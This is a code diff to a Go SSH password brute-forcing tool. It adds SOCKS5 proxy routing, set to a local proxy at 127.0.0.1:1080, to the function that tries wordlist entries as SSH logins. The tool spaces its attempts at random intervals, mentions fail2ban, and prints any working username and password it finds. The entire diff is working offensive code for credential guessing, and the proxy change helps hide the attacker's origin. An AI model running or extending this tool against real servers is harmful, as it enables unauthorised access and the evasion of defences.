@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"golang.org/x/crypto/ssh"
+	"golang.org/x/net/proxy"
 	"math/rand"
 	"net"
 	"os"
@@ -17,7 +18,49 @@ var sem = make(chan struct{}, 1)
 var wg sync.WaitGroup
 var operationDone = false
 
-func sshlogin(addr string, username string, password string, timeout int64) bool {
+type ProxySettings struct {
+	ip       string
+	port     int
+	username string
+	password string
+}
+
+func CustomDialTimeout(network, address string, timeout time.Duration, proxysetting ProxySettings) (net.Conn, error) {
+	d := net.Dialer{Timeout: timeout}
+	if proxysetting.ip == "" {
+		return d.Dial(network, address)
+	}
+	if proxysetting.username != "" {
+		auth := proxy.Auth{
+			User:     proxysetting.username,
+			Password: proxysetting.password,
+		}
+		dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), &auth, &d)
+		if err != nil {
+			return nil, err
+		}
+		return dialSocksProxy.Dial(network, address)
+	}
+	dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), nil, &d)
+	if err != nil {
+		return nil, err
+	}
+	return dialSocksProxy.Dial(network, address)
+}
+
+func CustomDial(network, addr string, config *ssh.ClientConfig, proxysetting ProxySettings) (*ssh.Client, error) {
+	conn, err := CustomDialTimeout(network, addr, config.Timeout, proxysetting)
+	if err != nil {
+		return nil, err
+	}
+	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
+	if err != nil {
+		return nil, err
+	}
+	return ssh.NewClient(c, chans, reqs), nil
+}
+
+func sshlogin(addr string, username string, password string, timeout int64, proxysetting ProxySettings) bool {
 	config := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
@@ -27,7 +70,7 @@ func sshlogin(addr string, username string, password string, timeout int64) bool
 		Timeout:         time.Duration(timeout * int64(time.Second)),
 	}
 	// Todo: implement another check to detect fail2ban or other connectivity problems. which does not indicate that the login was correct or incorrect
-	client, err := ssh.Dial("tcp", addr, config)
+	client, err := CustomDial("tcp", addr, config, proxysetting)
 	if err != nil {
 		return false
 	}
@@ -37,6 +80,7 @@ func sshlogin(addr string, username string, password string, timeout int64) bool
 
 func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
 	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
+	proxysetting := ProxySettings{ip: "127.0.0.1", port: 1080}
 	for _, wordlistline := range list {
 		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
 		if operationDone {
@@ -48,7 +92,7 @@ func runWordlistPart(addr string, list []string, username string, timeout int64,
 			usr = wordlistline
 			pwd = username // Not the best naming I know :D
 		}
-		if sshlogin(addr, usr, pwd, timeout) {
+		if sshlogin(addr, usr, pwd, timeout, proxysetting) {
 			fmt.Println("================================")
 			fmt.Println(" Found working combo")
 			fmt.Println(" Username: " + usr)
